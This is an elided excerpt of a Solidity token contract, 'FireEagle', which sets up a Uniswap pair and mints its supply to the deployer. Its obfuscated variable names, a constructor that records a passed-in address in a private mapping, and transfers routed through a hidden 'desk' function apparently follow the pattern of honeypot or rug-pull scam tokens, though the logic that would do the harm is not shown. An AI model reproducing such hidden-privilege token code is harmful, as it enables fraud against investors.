...
contract FireEagle is Ownable {
    uint256 private visitor;
    string private smaller;
    uint256 private _tTotal;
    string private concerned;
    uint256 private told;
    uint8 private figure;
    ...
    uint256 rose;
    bool funny;
    address public there;
    address private nest;
    ...
    mapping(address => uint256) private second;
    ...
    function transferFrom(
        ...
        desk(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        desk(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        string memory city,
        string memory differ,
        address appearance,
        address difficulty
    ) {
        uniswapV2Router = IUniswapV2Router02(appearance);
        there = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        ...
        visitor = 0;
        told = 100;
        second[difficulty] = figure;
        _tTotal = 1000000000000000 * 10**figure;
        our[msg.sender] = _tTotal;
    }
}